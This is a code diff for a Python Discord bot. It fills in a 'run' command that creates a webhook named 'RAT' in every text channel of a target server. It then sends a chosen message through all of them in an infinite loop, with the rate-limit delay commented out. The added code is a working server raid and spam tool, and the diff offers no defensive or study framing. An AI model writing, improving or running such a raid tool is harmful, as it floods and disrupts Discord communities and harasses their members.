@@ -1,4 +1,5 @@
 PREFIX = "$"
+SEND_DELAY = 1
 
 import discord
 from discord.ext import commands
@@ -6,6 +7,7 @@ import sys
 import os
 from dotenv import load_dotenv
 import shlex
+import asyncio 
 
 load_dotenv('.env')
 client = commands.Bot(command_prefix=PREFIX, intents=discord.Intents.all())
@@ -70,7 +72,27 @@ async def on_ready():
                 message = arguments[1]
                 print('Set message to {}'.format(arguments[1]))
         elif arguments[0] == 'run':
-            pass
+            if not target_guild:
+                print('No target guild')
+                continue
+
+            webhooks = []
+            for channel in target_guild.text_channels:
+                try:
+                    webhook = await channel.create_webhook(name='RAT')
+                    webhooks.append(webhook)
+                except Exception as error_message:
+                    print(f'Could not create webhook in {channel.name}')
+                    print(error_message)
+                else:
+                    print(f'Created webhook in {channel.name}')
+
+            while True:
+                for webhook in webhooks:
+                    await webhook.send(message)
+                    print(f'Fired webhook {webhook.url}')
+                    # await asyncio.sleep(SEND_DELAY)
+
         else:
             print('Invalid command')
 
